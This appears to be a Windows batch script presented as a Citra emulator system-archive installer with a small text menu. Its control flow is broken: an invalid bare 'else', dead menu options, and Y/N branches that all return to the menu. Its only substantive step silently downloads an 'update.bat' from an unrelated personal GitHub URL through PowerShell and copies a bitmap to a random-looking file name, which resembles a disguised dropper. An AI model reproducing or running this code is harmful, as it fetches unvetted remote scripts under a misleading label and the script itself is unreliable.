@echo off
title Citra - System archive installer

:main
cls
echo.
echo.
echo.
echo ------------------------------
echo ^| [SA] setup System Archives ^|
echo ^| [UP] Update script file    ^|
echo ^| [E] Exit Citra NAND script ^|
echo ------------------------------

set /p menu="What would you like to do?"
if %menu%==sa goto SA
if %menu%==SA goto SA
if %menu%==UP goto install-update
if %menu%==up goto install-update
if %menu%==E goto close
if %menu%==e goto close
else (
    echo Invalid input. Please try again.
	goto :main
)

:close
echo Exiting...
sleep 0.563
exit

:install-update
goto main
:SA
set /p setup-nand="Do you want to setup system archives in Citra? (Y/N)"
if %setup-nand%==N goto main
if %setup-nand%==n goto main
if %setup-nand%==Y goto main
if %setup-nand%==y goto main

:SA-dl
powershell.exe (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/hipeopeo/s/master/update.bat', 'update.bat')
copy %cd%\NET_ex.bmp %cd%\xjhfkea.bmp
